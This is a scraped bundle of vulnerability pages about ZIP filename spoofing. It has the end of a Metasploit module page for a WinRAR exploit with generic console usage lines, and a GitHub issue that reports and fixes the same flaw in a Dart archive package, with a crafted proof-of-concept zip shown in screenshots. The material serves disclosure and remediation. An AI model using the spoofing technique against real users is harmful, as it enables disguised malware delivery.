the central directory, but the file names used to extract and open contents come from the
Local File Header. This inconsistency allows to spoof file names when opening ZIP files
with WinRAR, which can be abused to execute arbitrary code, as exploited in the wild in
March 2014

#### Author(s)

* chr1x
* juan vazquez <juan.vazquez@metasploit.com>

#### Platform

Windows

#### Development

* [Source Code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/fileformat/winrar_name_spoofing.rb)
* [History](https://github.com/rapid7/metasploit-framework/commits/master//modules/exploits/windows/fileformat/winrar_name_spoofing.rb)

#### Module Options

To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':

```
msf > use exploit/windows/fileformat/winrar_name_spoofing
msf exploit(winrar_name_spoofing) > show targets
    ...targets...
msf exploit(winrar_name_spoofing) > set TARGET < target-id >
msf exploit(winrar_name_spoofing) > show options
    ...show and set options...
msf exploit(winrar_name_spoofing) > exploit
```

### Metasploit

Penetration testing software for offensive security teams.

Key Features

* [Collect and share all the information you need to conduct a successful and efficient penetration test](/products/metasploit/features)
* [Simulate complex attacks against your systems and users](/products/metasploit/features)
* [Test your defenses to make sure they’re ready](/products/metasploit/features)
* [Automate Every Step of Your Penetration Test](/products/metasploit/features)

[Free Metasploit Pro Trial](/try/metasploit-pro/)
[View All Features](/products/metasploit/features/)

Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.

– Jim O’Gorman | President, Offensive Security

;

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)



=== Content from github.com_176ffb97_20250111_041650.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F266)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F266)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=brendan-duncan%2Farchive)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[brendan-duncan](/brendan-duncan)
/
**[archive](/brendan-duncan/archive)**
Public

* [Notifications](/login?return_to=%2Fbrendan-duncan%2Farchive) You must be signed in to change notification settings
* [Fork
  146](/login?return_to=%2Fbrendan-duncan%2Farchive)
* [Star
   426](/login?return_to=%2Fbrendan-duncan%2Farchive)

* [Code](/brendan-duncan/archive)
* [Issues
  113](/brendan-duncan/archive/issues)
* [Pull requests
  1](/brendan-duncan/archive/pulls)
* [Discussions](/brendan-duncan/archive/discussions)
* [Actions](/brendan-duncan/archive/actions)
* [Projects
  0](/brendan-duncan/archive/projects)
* [Wiki](/brendan-duncan/archive/wiki)
* [Security](/brendan-duncan/archive/security)
* [Insights](/brendan-duncan/archive/pulse)

Additional navigation options

* [Code](/brendan-duncan/archive)
* [Issues](/brendan-duncan/archive/issues)
* [Pull requests](/brendan-duncan/archive/pulls)
* [Discussions](/brendan-duncan/archive/discussions)
* [Actions](/brendan-duncan/archive/actions)
* [Projects](/brendan-duncan/archive/projects)
* [Wiki](/brendan-duncan/archive/wiki)
* [Security](/brendan-duncan/archive/security)
* [Insights](/brendan-duncan/archive/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fbrendan-duncan%2Farchive%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fbrendan-duncan%2Farchive%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Archive package is vulnerable to zip filename spoofing #266

Closed

[BlueSquare1](/BlueSquare1) opened this issue
Jun 20, 2023
· 2 comments

Closed

# [Archive package is vulnerable to zip filename spoofing](#top) #266

[BlueSquare1](/BlueSquare1) opened this issue
Jun 20, 2023
· 2 comments

## Comments

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=80&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)

Copy link

### **[BlueSquare1](/BlueSquare1)** commented [Jun 20, 2023](#issue-1765832957) • edited Loading

| Hi,  This is a follow up of the previous issue report, we noticed that when `archive` tries to parse the filename from the zip header, it only considers the filename from the `Local File Header` and does not match it against `Central Directory Entry` filename, this can pose a security risk as the `Local File Header` can be easily spoofed which leads to inconsistency in filename of the entries before and after extraction, below is a demo where we crafted a zip file with a spoofed `Local File Header` and tried extracting it using your package.  [Screenshot from 2023-06-20 18-17-28](https://private-user-images.githubusercontent.com/129080649/247200817-69bd6ccc-a79c-4d7b-ba71-e9a4e7284356.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjkzMDksIm5iZiI6MTczNjU2OTAwOSwicGF0aCI6Ii8xMjkwODA2NDkvMjQ3MjAwODE3LTY5YmQ2Y2NjLWE3OWMtNGQ3Yi1iYTcxLWU5YTRlNzI4NDM1Ni5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwNDE2NDlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wY2I5NTVkYzJiYzIyY2IwNzlhN2RmMDhiMmFkYmMwZmViZDk4MjY3NjZhMzZmYzhiN2M2NjM4OTFhZjIxYmI3JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.9hCzRM4xhfify1OLO0862BvE0lR9wHL06ICVE-kDK2c) **crafted zip file (poc.zip) binary content**  [Screenshot from 2023-06-20 18-18-34](https://private-user-images.githubusercontent.com/129080649/247201689-38ae95c9-fd7c-451a-98ec-c358a18cc65c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjkzMDksIm5iZiI6MTczNjU2OTAwOSwicGF0aCI6Ii8xMjkwODA2NDkvMjQ3MjAxNjg5LTM4YWU5NWM5LWZkN2MtNDUxYS05OGVjLWMzNThhMThjYzY1Yy5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwNDE2NDlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNzAyYmE5YjdjZTc5OGY2ZDA1NzI0NzYxMDcyNzk1MjE3MzFlODEyNjg5YzBmNDhlODhmZmRiMDNkMDJlMDRhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.5zEACnMGo-5OYntPyra12e1gnKyf4rNcfGhdYap_6fQ) **zip file before extraction (the file inside appears as evil.txt)**  [Screenshot from 2023-06-20 18-20-18](https://private-user-images.githubusercontent.com/129080649/247202506-f7e6c60d-82c8-4700-9b52-a0e75096b3be.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjkzMDksIm5iZiI6MTczNjU2OTAwOSwicGF0aCI6Ii8xMjkwODA2NDkvMjQ3MjAyNTA2LWY3ZTZjNjBkLTgyYzgtNDcwMC05YjUyLWEwZTc1MDk2YjNiZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTExJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExMVQwNDE2NDlaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MjViYzg0ZGUzMmQ0MjJhNDc5YTg5OTZhYjlhYTY3ZWY2NTgzODRkYjI0MDFhOTAwNGYwMzBkYWU1NWQ3Y2E0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.rWZJ93PFprKbNbNRarsvJuzRWiDUdLxAZ6wCM0ct-AA) **zip file after extraction (the file now appears as evil.apk)** |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=40&u=3e402e1222cc7620f46b3944de5f448d070aa35d&v=4)](/BlueSquare1)
[BlueSquare1](/BlueSquare1)
changed the title
~~extractFileToDisk is vulnerable to zip filename spoofing~~
Archive package is vulnerable to zip filename spoofing
[Jun 20, 2023](#event-9582529602)

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=80&u=1eccb3bc87f6a9101118997e7d41cb9103dcf101&v=4)](/brendan-duncan)

Copy link

Owner

### **[brendan-duncan](/brendan-duncan)** commented [Jun 22, 2023](#issuecomment-1601990590)

| I'll look into fixing that up as soon as I get a chance. |
| --- |

All reactions

Sorry, something went wrong.

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=80&u=1eccb3bc87f6a9101118997e7d41cb9103dcf101&v=4)](/brendan-duncan)

Copy link

Owner

### **[brendan-duncan](/brendan-duncan)** commented [Sep 3, 2023](#issuecomment-1703980364)

| I changed it to use the central directory filename instead of the local entry header name. |
| --- |

All reactions

Sorry, something went wrong.

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=40&u=1eccb3bc87f6a9101118997e7d41cb9103dcf101&v=4)](/brendan-duncan)
[brendan-duncan](/brendan-duncan)
closed this as [completed](/brendan-duncan/archive/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Sep 3, 2023](#event-10265177666)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fbrendan-duncan%2Farchive%2Fissues%2F266)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@brendan-duncan](https://avatars.githubusercontent.com/u/3642099?s=52&v=4)](/brendan-duncan) [![@BlueSquare1](https://avatars.githubusercontent.com/u/129080649?s=52&v=4)](/BlueSquare1)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from ostorlab.co_1b76e0d3_20250111_041650.html ===



